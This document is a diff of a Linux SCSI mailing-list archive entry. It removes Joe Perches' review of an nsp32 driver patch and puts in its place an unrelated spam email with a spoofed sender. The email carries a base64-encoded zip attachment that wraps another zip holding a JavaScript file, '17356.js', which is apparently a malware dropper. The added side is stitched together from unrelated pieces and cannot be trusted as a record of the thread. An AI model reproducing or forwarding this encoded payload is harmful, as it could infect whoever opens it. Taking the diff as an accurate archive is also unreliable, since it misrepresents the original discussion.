@@ -1,55 +1,70 @@
-From: Joe Perches <joe@perches.com>
-Subject: Re: [PATCH 1/2] scsi: nsp32: add __printf attribute to logging
- functions
-Date: Sat, 20 May 2017 04:35:36 -0700
-Message-ID: <1495280136.27714.6.camel@perches.com>
-References: <20170520111628.24787-1-nicolas.iooss_linux@m4x.org>
+From: <john.dahlberg@landshypotek.se>
+Subject: (unknown)
+Date: Sat, 20 May 2017 11:47:30 -0000
+Message-ID: <149528085019.1557.4769562393026927872@mytrinity.com.ua>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="ISO-8859-1"
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="899954395.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from smtprelay0088.hostedemail.com ([216.40.44.88]:56528 "EHLO
-        smtprelay.hostedemail.com" rhost-flags-OK-OK-OK-FAIL)
-        by vger.kernel.org with ESMTP id S1750831AbdETLfm (ORCPT
-        <rfc822;linux-scsi@vger.kernel.org>);
-        Sat, 20 May 2017 07:35:42 -0400
-In-Reply-To: <20170520111628.24787-1-nicolas.iooss_linux@m4x.org>
+Received: from 5-105-40-106.mytrinity.com.ua ([5.105.40.106]:47450 "HELO
+        mytrinity.com.ua" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752424AbdETLrs (ORCPT
+        <rfc822;linux-scsi@vger.kernel.org>); Sat, 20 May 2017 07:47:48 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: Nicolas Iooss <nicolas.iooss_linux@m4x.org>, GOTO Masanori <gotom@debian.or.jp>, YOKOTA Hiroshi <yokota@netlab.is.tsukuba.ac.jp>
-Cc: "James E.J. Bottomley" <jejb@linux.vnet.ibm.com>, "Martin K. Petersen" <martin.petersen@oracle.com>, linux-scsi@vger.kernel.org, linux-kernel@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-On Sat, 2017-05-20 at 13:16 +0200, Nicolas Iooss wrote:
-> nsp32_message() and nsp32_dmessage() use printf format strings in order
-> to format a message. Adding __printf attributes helps to detect errors
-> in such format strings at build time, like:
-> 
->     drivers/scsi/nsp32.c:3314:23: error: format '%ld' expects argument
->     of type 'long int', but argument 6 has type 'pm_message_t {aka
->     struct pm_message}' [-Werror=format=]
->       nsp32_msg(KERN_INFO,
->       "pci-suspend: pdev=0x%p, state=%ld, slot=%s, host=0x%p",
->       pdev, state, pci_name(pdev), host);
-> 
-> Fix all format string errors which were reported by gcc.
-[]
-> diff --git a/drivers/scsi/nsp32.c b/drivers/scsi/nsp32.c
-[]
-> @@ -321,7 +323,8 @@ static struct scsi_host_template nsp32_template = {
->  
->  #define NSP32_DEBUG_BUF_LEN		100
->  
-> -static void nsp32_message(const char *func, int line, char *type, char *fmt, ...)
-> +static __printf(4, 5)
-> +void nsp32_message(const char *func, int line, char *type, const char *fmt, ...)
->  {
->  	va_list args;
->  	char buf[NSP32_DEBUG_BUF_LEN];
-
-These could also use vsprintf extension %pV instead of
-vsnprintf to a
-temporary buffer and then using "%s, <tmp>"
-
-etc...
-
-Does anyone actually have or use these cards any longer?
+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
+AAEAWwAAAPcKAAAAAA==
